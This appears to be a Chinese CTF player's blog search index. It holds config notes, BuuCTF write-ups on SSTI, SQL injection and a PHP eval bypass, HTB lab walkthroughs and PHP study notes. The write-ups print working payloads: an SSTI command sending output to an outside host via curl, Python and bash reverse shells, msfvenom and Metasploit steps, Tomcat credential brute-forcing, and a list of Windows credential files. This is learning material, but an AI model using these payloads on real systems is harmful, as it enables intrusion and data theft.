{"pages":[{"title":"cjM00N","text":"关于我华工大三信安专业在读, 熟练使用&lt;C-c&gt; &lt;C-v&gt;编程 常用ID cjM00N or 月亮 目前为Kap0k战队Web手, NS玩家 , 吉他初学者 以及单身 联系方式Email: ​Y2ptMDBuQHFxLmNvbQ==","link":"/about/index.html"}],"posts":[{"title":"Config文档","text":"记录下常用的配置 git proxy让git走代理, 基本可以达到满速 1git config --global http.https://github.com.proxy socks5h://127.0.0.1:10808 删除代理 1git config --global --unset http.https://github.com.proxy zsh12apt install zshsh -c &quot;$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot; zshrc12345678910111213# themeZSH_THEME=&quot;ys&quot;# aliasalias ctf=&quot;cd /mnt/hgfs/ctf&quot;alias tools=&quot;cd /mnt/hgfs/tools&quot;alias clash=&quot;~/clash/clash -d ~/clash/&quot;alias htbvpn=&quot;openvpn ~/cjM00N.ovpn&quot;alias pc=&quot;proxychains&quot;alias tmuxa=&quot;tmux a -t&quot;alias tmuxn=&quot;tmux new -s&quot;alias vi=&quot;vim&quot;alias burp=&quot;/opt/Burpsuite/start.sh&quot; 内外网切换12345netstat -nr 查看路由表sudo route delete 0.0.0.0 删除默认路由sudo route add -net 0.0.0.0 192.168.1.1 默认使用192.168.1.1网关sudo route add 10.200.0.0 10.200.22.254 有线网卡使用该网关sudo route add 10.0.1.0/24 10.200.22.254 其它网段指定网关 切换java版本1update-alternatives --config java tmux配置123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# reload with Ctrl+rbind C-r source-file ~/.tmux.conf \\; display &quot;Reloaded!&quot;# tmux attachnew-session# vi keymapset-option -g status-keys viset-window-option -g mode-keys vi# vi-type selection and copybind -T copy-mode-vi v send-keys -X begin-selectionbind -T copy-mode-vi y send-keys -X copy-selection-and-cancel# choose pane with vi-keybind -r ^k selectp -Ubind -r ^j selectp -Dbind -r ^h selectp -Lbind -r ^l selectp -R# exec command manbind m command-prompt &quot;splitw -h &apos;exec man %%&apos;&quot;# add Ctrl+a to prefix key set -g prefix2 C-abind C-a send-prefix -2# new pane - = # horizontalunbind &apos;&quot;&apos;bind - splitw -v -c &apos;#&#123;pane_current_path&#125;&apos; # verticalunbind %bind = splitw -h -c &apos;#&#123;pane_current_path&#125;&apos; # colorset -g default-terminal &quot;screen-256color&quot;# renamesetw -g automatic-rename offsetw -g allow-rename off# mouse set -g mouse on# ------ status theme -------------------------------set -g message-style &quot;bg=#00346e, fg=#ffffd7&quot; # tomorrow night blue, base3set -g status-style &quot;bg=#00346e, fg=#ffffd7&quot; # tomorrow night blue, base3set -g status-left &quot;#[bg=#0087ff] &gt; #S &quot; # blueset -g status-left-length 400set -g status-right &quot;#[bg=#0087ff] #(whoami)@#h #[bg=red] %Y-%m-%d %H:%M &quot;set -g status-right-length 600set -g set-clipboard onset -g history-limit 8000set -wg window-status-format &quot; #I #W &quot;set -wg window-status-current-format &quot; #I #W &quot;set -wg window-status-separator &quot;&quot;set -wg window-status-current-style &quot;bg=red&quot; # redset -wg window-status-last-style &quot;fg=#dddddd&quot;set -wg pane-active-border-style &quot;fg=blue&quot;set -wg pane-border-style &quot;fg=#585858&quot; # base01set -g status-justify left powershell 设置别名打开配置文件 1code $PROFILE 设置别名样例如下 1234function cdTools&#123; Set-Location D:\\tools&#125;Set-Alias tools cdTools 重启powershell即可","link":"/2019/10/24/Config文档/"},{"title":"BuuCTF刷题记录2","text":"感谢glzjin师傅 [WesternCTF2018]shrine首先看题目 1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) WAF只有过滤()和设置config以及self为空, 而我们可以看到flag在app.config里面, 这里参考 https://www.jianshu.com/p/1237c78a691c 没有了直接的config, 我们可以通过current_app来获取, 通过查阅手册, 可以发现在函数url_for中存在这个变量 那么就可以通过下面的payload来获取 1&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config&#125;&#125; 同样的函数还有get_flashed_messages 或者使用 1&#123;&#123;app.__init__.__globals__.sys.modules.app.app.__dict__&#125;&#125; 国外大佬的方法就比较硬核了 https://ctftime.org/writeup/10851 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# search.pydef search(obj, max_depth): visited_clss = [] visited_objs = [] def visit(obj, path='obj', depth=0): yield path, obj if depth == max_depth: return elif isinstance(obj, (int, float, bool, str, bytes)): return elif isinstance(obj, type): if obj in visited_clss: return visited_clss.append(obj) print(obj) else: if obj in visited_objs: return visited_objs.append(obj) # attributes for name in dir(obj): if name.startswith('__') and name.endswith('__'): if name not in ('__globals__', '__class__', '__self__', '__weakref__', '__objclass__', '__module__'): continue attr = getattr(obj, name) yield from visit(attr, '&#123;&#125;.&#123;&#125;'.format(path, name), depth + 1) # dict values if hasattr(obj, 'items') and callable(obj.items): try: for k, v in obj.items(): yield from visit(v, '&#123;&#125;[&#123;&#125;]'.format(path, repr(k)), depth) except: pass # items elif isinstance(obj, (set, list, tuple, frozenset)): for i, v in enumerate(obj): yield from visit(v, '&#123;&#125;[&#123;&#125;]'.format(path, repr(i)), depth) yield from visit(obj) 修改的app.py 123456789101112131415161718192021import flaskimport osfrom flask import requestfrom search import searchapp = flask.Flask(__name__)app.config['FLAG'] = 'TWCTF_FLAG'@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): for path, obj in search(request, 10): if str(obj) == app.config['FLAG']: return pathif __name__ == '__main__': app.run(debug=True) 通过遍历request来查找是否存在某个子属性和app.config[&#39;FLAG&#39;]是一致的, 最后找的payload是 1&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&apos;json&apos;].JSONEncoder.default.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125; 其实可以看到和前面的思路是一致的, 只是获取的路径不同 [GWCTF 2019]你的名字顺带就来做一下上次比赛没整出来的SSTI 这道题其实很明显的是模板注入, 出题人恶趣味的用了index.php这样的路由, 但是实际上还是一道python题 先来fuzz一下 当输入为class的时候, 结果会被过滤, 应该是有waf 用6测一下发现还有php的报错, 这是真的sxbk 但是这里是用不了了 我们上网查一下就会发现, 在ssti中过滤了后, 可以通过{\\%外带 Python模板注入(SSTI)深入学习 上面链接中的payload改一下就可以用 1&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;curl http://xx.xxx.xx.xx:8080/?i=`ls /`&apos;) %&#125;1&#123;% endif %&#125; 但是还有一个问题是有关键字符的过滤, 上网找一下ssti的字典 当然是没找到了 可以发现双写绕不过, 应该是循环匹配, 替换为空的话我们可以利用这个特点来绕过, 但是这里毫无提示, 感觉只能纯靠猜, 找到一个词符合以下条件 在ban_list中尽量靠后 不出现在我们的payload里面 由于第一个是黑箱, 我们只能从第二个入手 fuzz脚本 12345678910111213141516171819202122232425262728293031323334353637import reimport requestsfrom time import sleepurl = \"http://f9fd3c30-c575-4a29-88a3-680ebc168df5.node3.buuoj.cn\"def gen_words(): f = open(\"ssti_payload.txt\", \"r\").read() words = re.findall(\"[a-zA-Z]+\", f) f = open(\"ssti_word.txt\", \"w\") res = sorted(list(set(words))) for i in res: f.write(i + \"\\n\") return resdef find_unused_word(words, payload): used_word = list(set(re.findall(\"[a-zA-Z]+\", payload))) return [i for i in words if i not in used_word]def fuzz(): payload = \"&#123;% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`ls /`') %&#125;1&#123;% endif %&#125;\" words = gen_words() unused_word = find_unused_word(words, payload) for i in unused_word: data = &#123; \"name\": i &#125; res = requests.post(url, data=data).text if \"hello !\" in res: data = &#123; \"name\": \"cla\" + i + \"ss\" &#125; res = requests.post(url, data=data).text if \"class\" in res: print(f\"[*] find &#123;i&#125;\") sleep(0.1)if __name__ == \"__main__\": fuzz() 由于结果只有几个, 我们挨个试一下, 就会发现config是可用的 使用小号开一个Linux labs 之后再改造一下payload 1&#123;% iconfigf &apos;&apos;.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen(&apos;curl http://174.0.167.222:2333/ -d `ls /|base64`&apos;) %&#125;1&#123;% endiconfigf %&#125; 注意这里最后必须要是endiconfigf, 不是很懂为什么, 猜测是要和前面的iconfigf一致吧, 其他的情况都会导致打不通 然后我们就可以rce了, 由于返回只有一行, 就拼接了个|base64 [SWPU2019]Web1这题咋一看还以为是个XSS—- 但是这管理员一直不确认的就很迷惑了 然后查了一下才发现不是XSS是个SQL题 可以看到注入点有几个, 比如申请广告这里 还有查看的时候 测试一下发现id那里打不通, 就回到广告这里, 顺利的看到了注入点 当然这丧心病狂的22列是真的顶 首先可以看到被过滤, 直接使用/**/或者(就可以绕过了, 主要是下面两点 Bypass information_schema做过sqli的都知道这个库的厉害, 但是现在也经常被过滤 (例如过滤or), 那么我们就需要新的姿势了 https://www.anquanke.com/post/id/193512 https://www.cnblogs.com/wangtanzhi/p/12241499.html 可以看到大部分是用了sys.schema_auto_increment_columns这个库 由于在Buuoj上面没有这个库, 这里用的姿势是 1-1&apos;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22 这样来获取表名 无列名注入先回顾一下我们常规的思路, 一般我们是通过information_schema.columns注入出所有列名再进行查询, 而这里我们用不了这个库, 就可以考虑无列名注入 1select 1,2,3; 此时可以看到列名分别为1,2,3 1select 1,2,3 union select * from users; 这里可以看到我们通过union连接来改变原来的列名, 所以我们可以通过 1select `2` from (select 1,2,3 union select * from users)x; 这里有几个注意的点 列名用反引号, 这里因为是数字, 我们需要使用反引号包起来, 如果不用的话会全部变成2 子select要用()包起来 子select最后要赋予一个别名, 不然会报错 然后我们就可以注入了 12-1&apos;union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22 我现在才发现select*from users是成立的, 中间不需要用空格…. 然后就可以拿flag了 [CISCN 2019 初赛]Love Math这道题蛮有意思的, 先看代码 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c']))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) &#123; die(\"太长了不会算\"); &#125; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $content)) &#123; die(\"请不要输入奇奇怪怪的字符\"); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(\"请不要输入奇奇怪怪的函数\"); &#125; &#125; //帮你算出答案 eval('echo '.$content.';');&#125; 代码中做了三个判断 长度必须小于80 过滤一部分符号 1&apos; &apos;, &apos;\\t&apos;, &apos;\\r&apos;, &apos;\\n&apos;,&apos;\\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\\[&apos;, &apos;\\]&apos; 匹配所有函数变量名必须在$whitelist中, 比如pi 这个正则来源可以见 https://www.php.net/manual/zh/language.variables.basics.php 其实第一个是最难的hhhh 看一下手册就可以看到, 有个函数很特别 这个返回值是string就很妙了, 那么我们可以通过这样的方法来转换出我们需要的字符 123$command = \"phpinfo\";echo base_convert($command,36,10);# &gt;:55490343972 这样就能得到一个纯数字, 然后通过 1base_convert(55490343972,10,36)(); 就可以执行了 然后同理我们可以拼出 12base_convert(1751504350,10,36)(base_convert(784,10,36));# system(ls) 但是读文件就比较困难了, base_convert只能转换[a-z0-9], 而读文件需要空格, 本题的flag在/flag, 那就势必需要能够转换特殊字符的函数了, 这里有两个思路 hex2bin先看一下手册 这个函数可以实现将Hex转换成字符串, 也就是 但是这样会出现字母, 本地先转换成10进制, 然后在payload使用dechex转换回去就可以了, 具体操作如下 123base_convert(696468,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))# system(hex2bin(dechex(1819484207)))# system(&apos;ls /&apos;) 当然想法很好, 长度却不够了, 这里的替换思路有两个, 一个是将system换成exec, 并更改进制来尽量减少位数, 只要不出现字母就可以了 12base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(1819484207)))# exec(&apos;ls /&apos;) 刚好79, 可以执行 但是没有全部返回hhh, 这里知道是在/flag, 就可以直接打, 不过命令也是比较取巧 12base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260451114)))# exec(&apos;nl /*&apos;) 另外一种就是构造$_GET, 然后就可以为所欲为了hhhh 1234$pi=base_convert(3761671484,13,36)(dechex(1598506324));$$pi&#123;0&#125;($$pi&#123;1&#125;)# $pi=hex2bin(dechex(1598506324));# $pi=_GET# $$pi=$_GET 这里利用的是php的可变变量特性 剩下的就显而易见了 从其他位置获取参数可以在 https://xz.aliyun.com/t/4906#toc-8 中看到ROIS使用的payload是 12$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))()&#123;9&#125;)# system(getallheaders()&#123;9&#125;) 实测的时候一直没有打通, 研究了一下发现这个payload需要在apache环境下 buu上是用nginx, 所以打不通, 其他的类似函数因为长度问题用不了, 就当了解一下了","link":"/2020/02/14/BuuCTF刷题记录2/"},{"title":"HTB-Hack之旅","text":"我tcl MachinesBashed难度是ctf中的白给题 打开界面如下 点击phpbash后会跳转到github, 可以看到源码如下 123456if (ISSET($_POST['cmd'])) &#123; $output = preg_split('/[\\n]/', shell_exec($_POST['cmd'].\" 2&gt;&amp;1\")); foreach ($output as $line) &#123; echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . \"&lt;br&gt;\"; &#125; die(); 可以看到直接将命令传入shell, 不过有个2&gt;&amp;1, 会使得一些shell命令不执行 这里是根据wp一步一步做的, 首先看一下nmap 1nmap -sC -sV -oA nmap/init 10.10.10.68 nmap的命令可以参考 https://github.com/erasin/notes/blob/master/linux/safe/nmap.md -sC: 等价于 –script=default, 使用默认类别的脚本进行扫描 -sV: 指定让Nmap进行版本侦测 -oA: 输出至所有格式 可以看到结果如下 然后探测一下目录 1gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 结果如下 访问一下分别得到 123/dev/phpbash.php/php/sendmail.php/uploads/ (NULL) 然后可以通过phpbash来直接执行命令, 首先传一个LinEnum.sh查看一下系统的敏感信息 123456# localpython -m SimpleHTTPServer 8000# remotecd uploadswget http://ip:8000/LinEnum.sh bash LinEnum.sh 结果如下 12345678910[00;31m[-] Super user account(s):[00mroot[00;33m[+] We can sudo without supplying a password![00mMatching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL 看到有个无密码的账号scriptmanager 那我们再反弹个shell, 可以使用系统自带的php文件 1/usr/share/webshells/php/php-reverse-shell.php 修改ip和端口后, 在uploads写入 1wget http://ip:8000/php-reverse-shell.php 然后访问就可以拿到shell了 再利用附录的升级方法即可获得交互shell, 然后登录进scriptmanager 1su -u scriptmanager bash 可以在/下看到有个scripts文件夹, 访问之, 下面有个root权限的文件 如果可以看到test.py的原内容的话, 他其实是修改了test.txt, 这就说明test.py的执行其实是由root执行的, 但是我们可以写, 那就将内容改为反弹shell 1234567import socket,subprocess,os,ptys=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"ip\",port))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)pty.spawn(\"/bin/bash\") 然后本地监听即可 1nc -lvvp 2334 成功获取root权限 Lame首先进行全面的扫描 1nmap –T4 –A –v targethost -T4: T表示速度(0-5), 值越大则越快 -v: 显示冗余信息 -A: 进攻性的扫描 扫描结果如下, 可以看到有21和139和445应该是可以打的 尝试了一下21端口的vsftpd 2.3.3还真的没打通—, wp诚不欺我 1explort/unix/ftp/vsftpd_234_backdoor 老老实实跟着wp打 1234search CVE-2007-2447use exploit/multi/samba/usermap_script set RHOSTS 10.10.10.3run 然后就是root了 Legacy跟前一题很像, 还是nmap开局 1nmap -T2 -A -v -oA nmap/init 10.10.10.3 xp的机器, 开了smb, 这里可以用MS-08-067来打 理想是丰满的, 这一步我卡了很久很久(国内网络太差了) Jerry1nmap -sC -sV -oA nmap/init 10.10.10.95 8080开放, 访问它, gogo 可以看到是默认的tomcat页面, 有三个选项 server status: admin:admin可以直接访问, 但是没啥用, 查看另外两个, admin无法登陆, 使用hydra爆破 这里其实账号和密码都是明文的, 但是一般还是不会直接给出的, 所以这里还是按照wp的步骤爆破 12apt install seclistshydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html admin:admin不成功, 但是不知道为啥hydra给出来了, 我们这里使用tomcat:s3cret登录 登录进来后有了部署权, 可以传jsp马来getshell 首先使用msfvenom创建一个反弹shell的war马 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.10 LPORT=2334 -f war -o jerry.war 然后查看一下包里面的jsp文件地址 12mkdir tmpcd tmp &amp;&amp; unzip ../jerry.war 再部署到tomcat上面, 本地msf监听一下 123456msfdb runuse exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset LHOST tun0set LPORT 2334run # run -j 后台启动 访问tomcat上面的地址, 就可以在本地接到shell了, 下面是flag ippsec的视频做的真的好, 强烈建议看一看 Netmon1nmap -sC -sV -oA nmap/init 10.10.10.152 可以看到有ftp服务, 连上去康康 123ftp 10.10.10.152# user: Anonymous# pwd: Anonymous 登录之后可以拿到用户的flag 继续进行信息搜集, 我们可以根据下面的字典进行探测 https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768C:/Users/Administrator/NTUser.datC:/Documents and Settings/Administrator/NTUser.datC:/apache/logs/access.logC:/apache/logs/error.logC:/apache/php/php.iniC:/boot.iniC:/inetpub/wwwroot/global.asaC:/MySQL/data/hostname.errC:/MySQL/data/mysql.errC:/MySQL/data/mysql.logC:/MySQL/my.cnfC:/MySQL/my.iniC:/php4/php.iniC:/php5/php.iniC:/php/php.iniC:/Program Files/Apache Group/Apache2/conf/httpd.confC:/Program Files/Apache Group/Apache/conf/httpd.confC:/Program Files/Apache Group/Apache/logs/access.logC:/Program Files/Apache Group/Apache/logs/error.logC:/Program Files/FileZilla Server/FileZilla Server.xmlC:/Program Files/MySQL/data/hostname.errC:/Program Files/MySQL/data/mysql-bin.logC:/Program Files/MySQL/data/mysql.errC:/Program Files/MySQL/data/mysql.logC:/Program Files/MySQL/my.iniC:/Program Files/MySQL/my.cnfC:/Program Files/MySQL/MySQL Server 5.0/data/hostname.errC:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.logC:/Program Files/MySQL/MySQL Server 5.0/data/mysql.errC:/Program Files/MySQL/MySQL Server 5.0/data/mysql.logC:/Program Files/MySQL/MySQL Server 5.0/my.cnfC:/Program Files/MySQL/MySQL Server 5.0/my.iniC:/Program Files (x86)/Apache Group/Apache2/conf/httpd.confC:/Program Files (x86)/Apache Group/Apache/conf/httpd.confC:/Program Files (x86)/Apache Group/Apache/conf/access.logC:/Program Files (x86)/Apache Group/Apache/conf/error.logC:/Program Files (x86)/FileZilla Server/FileZilla Server.xmlC:/Program Files (x86)/xampp/apache/conf/httpd.confC:/WINDOWS/php.iniC:/WINDOWS/Repair/SAMC:/Windows/repair/systemC:/Windows/repair/softwareC:/Windows/repair/securityC:/WINDOWS/System32/drivers/etc/hostsC:/Windows/win.iniC:/WINNT/php.iniC:/WINNT/win.iniC:/xampp/apache/bin/php.iniC:/xampp/apache/logs/access.logC:/xampp/apache/logs/error.logC:/Windows/Panther/Unattend/Unattended.xmlC:/Windows/Panther/Unattended.xmlC:/Windows/debug/NetSetup.logC:/Windows/system32/config/AppEvent.EvtC:/Windows/system32/config/SecEvent.EvtC:/Windows/system32/config/default.savC:/Windows/system32/config/security.savC:/Windows/system32/config/software.savC:/Windows/system32/config/system.savC:/Windows/system32/config/regback/defaultC:/Windows/system32/config/regback/samC:/Windows/system32/config/regback/securityC:/Windows/system32/config/regback/systemC:/Windows/system32/config/regback/softwareC:/Program Files/MySQL/MySQL Server 5.1/my.iniC:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xmlC:/Windows/System32/inetsrv/config/applicationHost.configC:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log 接下来需要获取root权限, 先离开ftp看看其他的端口, 个人信息1234# ip10.10.14.10# bashbash -i &gt;&amp; /dev/tcp/10.10.14.10/2333 0&gt;&amp;1 交互式shell半交互式12# python ptypython -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos; 此时可以实现简单的交互, 处于半交互状态, 但是不能用vim这种命令 交互式首先将shell放到后台 1ctrl + z 然后执行 1stty raw -echo 接着使用fg将shell返回前台 1fg 现在的shell看起来会比较奇怪, 使用reset 1reset 再导入如下配置即可 123export SHELL=bashexport TERM=xterm256-colorstty rows 24 columns 80 吐槽一下为啥进入交互式后shell特别卡—- 参考资料 https://bbs.ichunqiu.com/thread-54982-1-1.html","link":"/2019/11/24/HTB-Hack之旅/"},{"title":"php和mysql开发笔记","text":"学习php圣经&lt;php和mysql Web开发&gt;的笔记 第一章 快速入门php两种标记123&lt;?php ... ?&gt;// 取决于php.ini中'short_open_tag'选项, 默认不开启&lt;? ... ?&gt; 双引号和单引号中的变量单引号不解析php变量, 双引号则会解析变量值 12345$a = 1;echo \"a=$a\";//&gt; a=1;echo 'a=$a';//&gt; a=$a heredoc语法通过标志(theEnd)来作为关闭标记, 只需要保证不会出现在文本中 123456789echo &lt;&lt;&lt;theEnd line 1 line 2 line 3theEnd;//&gt; line 1 line 2 line 3 php变量语法 区分大小写, 不同于函数名 可以与函数名相同 (函数则不可以与另一个函数名相同) 不需要先声明 声明常量常量引用时不需要$ 123define(\"PI\", 3.14)echo PI;//&gt; 3.14 引用引用不是指针, 而是别名, 此时$a和$b都指向了内存中的相同地址 1234567$a = 5;$b = &amp;$a;$a = 7;// a = b = 7//此时unset a不会改变$b的值unset($a);//b = 7;a = undefined 操作符优先级and or xor优先级比&amp;&amp; ||低 类型判断函数gettype可以用于返回类型的字符串形式, settype用于设置类型 123456$a = 1;echo gettype($a);//&gt; intsettype($a, 'float');echo gettype($a);//&gt; float 第二章 数据存储和读取文件读写读写模式 模式 模式名称 意义 r 读 从头开始读, 加上+表示读写 w 写 不存在文件时会创建文件, 存在时则会清空并从头开始写, 加上+表示读写 x 谨慎写 如果文件不存在则会返回false并抛出错误, 其他同w b 二进制 win会区分二进制文件和文本文件, linux则不会区分, 推荐使用 a 追加 不存在文件时会创建文件, 存在时则从文件尾部开始写, 加上+表示读写 t 文本 win下的一个选项, 不推荐使用 分隔符1234//winfopen(\"c:\\\\flag\",\"r\");//win and linux, 推荐fopen(\"../flag\",\"r\"); 写文件12345$fp = fopen(\"log.txt\", \"ab\");fwrite($fp, \"aaa\");file_put_contents(\"log.txt\", \"aaa\");fputs($fp, \"aaa\");fclose($fp); 读文件123456789101112131415161718// 判断文件末尾, file end of filewhile(!feof($fp))&#123;...&#125;;// 读字符while(!feof($fp))&#123; $char = fgetc($fp); if(!feof($fp))&#123; echo ($char == \"\\n\" ? \"&lt;br/&gt;\":$char); &#125;&#125;// 读一行fgets/fgetss/fgetcsv// 读任意长fread()// 读文件readfile($filename);fpassthru($fp);file($filename);//返回数组, 按行分割file_get_contents($filename);//返回文件内容, 不输出 其他文件操作12345678910// 判断文件存在file_exists($filename);// 获取文件大小filesize($filename);// 删除文件unlink($filename);// 文件指针定位rewind()/fseek()/ftell();// 文件锁flock(); 第三章 数组创建数组数组支持在结尾添加元素 12345678910// array$pro = array(&apos;Tires&apos;, &apos;Oil&apos;, &apos;Spark&apos;);$pro = array(&apos;Tires&apos; =&gt; 100, &apos;key&apos; =&gt; value);// since php5.4$pro = [&apos;Tires&apos;, &apos;Oil&apos;, &apos;Spark&apos;];$pro[3] = &apos;Plugs&apos;;// 多维数组$multi_pro = array(array(&apos;tires&apos;, 100), array(&apos;Spark&apos;, 99) ); 访问数组12$pro[0];$pro&#123;1&#125;; 循环123for($i = 0; $i &lt; 3; $i++)&#123;..&#125;foreach($pro =&gt; $value)&#123;...&#125; //foreach($pro as $key =&gt; $value)&#123;...&#125; // 数组排序123456789101112// 字典序,区分大小写sort()asort() ksort()// 反序rsort()arsort() krsort()// 自定义序usort($array, $func)// 数组随机shuffle()// 数组逆序array_reverse() 数组操作进出数组12array_push($array, $item);array_pop($array);//删除末尾 数组浏览123456789101112// 返回当前元素并指向下一个元素each()// 指向下一个元素并返回新的元素next()// 返回当前元素current()// 返回指向第一个元素的指针reset// 返回指向最后一个元素的指针end()// 指向上一个元素并返回新的元素prev() 统计数组1234// 返回元素个数count()/sizeof()// 返回每个特定值在数组中出现的次数, 返回值为数组array_count_values() 其他操作1234567// maparray_walk($array, $func, [userdata]);// 其中func定义为func($value, $key, $userdata); // 解析数组为变量, 不安全extract($array); 第四章 字符串字符串截断123456// 除去开始和结束的空格trim()// 除去开始的空格ltrim()// 除去结束的空格rtrim()/chop() html转换1234// html字符过滤htmlspecialchars();// /n =&gt; &lt;br/&gt;n2br(); 大小写123456strtoupper()strtolower();// 每个字符串首字母大写ucfirst();// 每个单词首字母大写ucwords() 格式化输出1%[+][&apos;padding_character][-][width][.precision]type + 表示正数输出 + padding_character 表示输出前缀, 除0和外都需要添加` -表示左对齐 width表示宽度 .precision表示小数点后位数 类型 意义 b 解释为整数并作为二进制输出 c 解释为整数并作为字符输出 d 解释为整数并作为小数输出 e 解释为双精度并以科学计数法打印, 精度是小数点后的数字个数 E 同e, 打印为大写E f 解释为双精度并作为浮点数输出 F 解释为浮点数并打印与locale无关的浮点数 g 转换规范类型e或f的简短输出 G 转换规范类型E或F的简短输出 o 解释为整数并作为8进制输出 s 解释为字符串输出 u 解释为整数并作为非指定小数输出 x 解释为整数并作为16进制小写输出 X 解释为整数并作为16进制大写输出 字符串连接切分1234// 切分explode($separator, $string);// 连接implode($separator, $array)/join(); 子串1234// strtok// start和length都可以是负数, 当length为负数时表示结束位置(end)substr($strings, start, [length]); 比较123456// 区分大小写strcmp()// 不区分大小写strcasecmp()// 自然序, 2&lt;12strnatcmp() 查找strpos函数如果不存在会返回false, 在弱类型比较中等同于0, 建议使用===作比较 12345678910// 查找子串, 返回从第一次子串出现到结束strstr($string, $substring)/strchr();// 忽略大小写stristr($string, $substring);// 返回最后一次匹配strrchr($string, $substring);// 查找, 返回第一次匹配位置strpos($string, $substring, [$offset]);// 返回最后一次匹配strrpos($string, $substring, [$offset]); 替换12str_replace($old, $new, $string);substr_replace($string, $new, $start, [$length]); 回溯引用模式的回溯引用通过一个反斜杠\\加一个数字或多个来表示, 用来匹配多次出现在一个字符串中的相同子表达式 12345/^([a-z]+) \\1 black sheep/$a = \"baa baa black sheep\";//&gt; 匹配$b = \"blah baa black sheep\";//&gt; 不匹配 正则分割1234print_r(preg_split(\"/\\.|@/\", \"user@admin.cn\"));//&gt; user admin cn 第五章 代码重用和函数auto_prepend_file1234567// php.iniauto_prepend_file = &quot;/path/to/header.php&quot;;auto_append_file = &quot;/path/to/footer.php&quot;;// .htaccess, 目录中每次每个文件都要进行处理, 性能较低php_value auto_prepend_file &quot;/path/to/header.php&quot;php_value auto_append_file &quot;/path/to/footer.php&quot;// 考虑安全问题可以使用readfile读入而不会自动解析代码 闭包闭包函数具有对全局作用域变量的访问, 但必须在闭包函数定义中使用use关键字显式定义 第六章 面向对象类属性修饰符默认为public private不可被继承, protected可以被继承 final关键字用于禁止类被继承或者函数被覆盖 不支持多重继承单一继承, 但是可以支持类似java的interface12345678interface Displayable&#123; function display();&#125;class Test implements Displayable&#123; function display()&#123; ... &#125;&#125; 或者使用Trait, 注意Trait会覆盖类继承的同名方法, 而类中自定义的方法可以覆盖Trait的方法123456789trait logger&#123; public function logmessage($message)&#123; ... &#125;&#125;class Test&#123; use logger; // this-&gt;logmessage();&#125; 如果使用了多个同名的Trait, 需要用insteadof声明所使用的函数 